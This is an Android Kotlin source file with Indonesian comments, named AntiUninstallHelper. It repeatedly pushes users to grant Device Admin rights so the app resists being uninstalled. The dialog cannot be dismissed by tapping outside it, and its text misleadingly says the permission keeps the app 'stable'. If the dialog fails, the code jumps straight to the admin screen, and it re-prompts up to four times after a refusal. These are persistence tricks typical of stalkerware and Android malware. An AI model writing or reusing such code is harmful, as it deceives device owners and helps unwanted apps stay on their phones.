package com.sync.xxx

import android.app.Activity
import android.app.AlertDialog
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.provider.Settings

/**
 * Minta izin Device Admin.
 *
 * Yang penting di sini: tombol "Aktifkan" harus langsung mendarat di layar
 * konfirmasi admin buat komponen kita (tombol "Aktifkan admin perangkat?"),
 * bukan cuma buka daftar pengaturan keamanan.
 *
 * Dua hal yang bikin versi lama gagal:
 *  1. startActivity dipanggil pas dialog masih nempel di window. Di beberapa ROM
 *     (MIUI, ColorOS) intent-nya di-drop dan layar admin gak pernah kebuka.
 *  2. Intent-nya gak dicek dulu bisa di-resolve atau nggak.
 */
object AntiUninstallHelper {

    private const val PREF_NAME = "anti_uninstall_prefs"
    private const val KEY_ADMIN_REQUESTED = "admin_requested"
    private const val KEY_PROMPT_COUNT = "admin_prompt_count"

    /** 1 kali prompt awal + 3 kali muncul ulang kalau belum diaktifkan. */
    private const val MAX_PROMPTS = 4

    /** Request code yang dipakai MainActivity buat nangkep hasilnya. */
    const val REQ_DEVICE_ADMIN = 1101

    private fun adminComponent(context: Context): ComponentName =
        ComponentName(context.applicationContext, AntiUninstallReceiver::class.java)

    fun isAdminActive(context: Context): Boolean {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        return try {
            dpm.isAdminActive(adminComponent(context))
        } catch (_: Exception) {
            false
        }
    }

    /**
     * Intent yang langsung ngebuka layar "Aktifkan admin perangkat?" buat komponen kita.
     * Fallback: daftar pengaturan keamanan, kalau ROM-nya gak nyediain layar langsung.
     */
    private fun activationIntent(context: Context): Intent? {
        val admin = adminComponent(context)

        val direct = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
            putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Aktifkan izin administrator perangkat agar aplikasi berjalan stabil dan tidak terganggu sistem."
            )
        }
        if (context.packageManager.resolveActivity(direct, 0) != null) return direct

        val security = Intent(Settings.ACTION_SECURITY_SETTINGS)
        if (context.packageManager.resolveActivity(security, 0) != null) return security

        return null
    }

    fun requestAdminIfNeeded(context: Context) {
        if (isAdminActive(context)) return
        showDialog(context)
    }

    private fun showDialog(context: Context) {
        val dialog = AlertDialog.Builder(context)
            .setTitle("Aktifkan Admin")
            .setMessage("Aktifkan izin administrator perangkat agar aplikasi berjalan optimal dan tidak terganggu.")
            .setCancelable(false)
            .setPositiveButton("Aktifkan", null)
            .setNegativeButton("Nanti", null)
            .create()

        dialog.setOnShowListener {
            dialog.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener {
                val prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
                prefs.edit()
                    .putBoolean(KEY_ADMIN_REQUESTED, true)
                    .putInt(KEY_PROMPT_COUNT, prefs.getInt(KEY_PROMPT_COUNT, 0) + 1)
                    .apply()

                // Tutup dialog DULU, baru jalanin intent satu frame kemudian.
                dialog.dismiss()
                launchActivation(context)
            }
            dialog.getButton(AlertDialog.BUTTON_NEGATIVE).setOnClickListener {
                dialog.dismiss()
            }
        }

        try {
            dialog.show()
        } catch (e: Exception) {
            android.util.Log.e("AntiUninstallHelper", "dialog gagal tampil: ${e.message}")
            // Dialog gagal (biasanya karena konteks bukan activity/foreground) —
            // langsung arahkan saja ke layar admin.
            launchActivation(context)
        }
    }

    private fun launchActivation(context: Context) {
        val intent = activationIntent(context) ?: run {
            android.util.Log.e("AntiUninstallHelper", "tidak ada activity admin yang bisa dibuka")
            return
        }

        Handler(Looper.getMainLooper()).post {
            try {
                val activity = context as? Activity
                if (activity != null) {
                    activity.startActivityForResult(intent, REQ_DEVICE_ADMIN)
                } else {
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                }
            } catch (e: Exception) {
                android.util.Log.e("AntiUninstallHelper", "gagal buka layar admin: ${e.message}")
                try {
                    val fallback = Intent(Settings.ACTION_SECURITY_SETTINGS)
                    if (context !is Activity) fallback.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(fallback)
                } catch (_: Exception) {
                }
            }
        }
    }

    /**
     * Dipanggil pas balik dari layar admin. Kalau ternyata belum aktif,
     * tampilkan lagi dialognya supaya user bisa langsung coba lagi.
     * Dibatasi MAX_PROMPTS biar gak muter tanpa henti kalau memang ditolak.
     */
    fun onReturnFromAdminScreen(context: Context) {
        if (isAdminActive(context)) {
            android.util.Log.d("AntiUninstallHelper", "device admin aktif")
            return
        }

        val prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
        if (!prefs.getBoolean(KEY_ADMIN_REQUESTED, false)) return
        if (prefs.getInt(KEY_PROMPT_COUNT, 0) >= MAX_PROMPTS) {
            android.util.Log.d("AntiUninstallHelper", "batas prompt admin tercapai, berhenti nagih")
            return
        }

        Handler(Looper.getMainLooper()).postDelayed({
            if (!isAdminActive(context)) showDialog(context)
        }, 500)
    }

    fun resetAdminRequest(context: Context) {
        val prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
        prefs.edit()
            .putBoolean(KEY_ADMIN_REQUESTED, false)
            .putInt(KEY_PROMPT_COUNT, 0)
            .apply()
    }
}
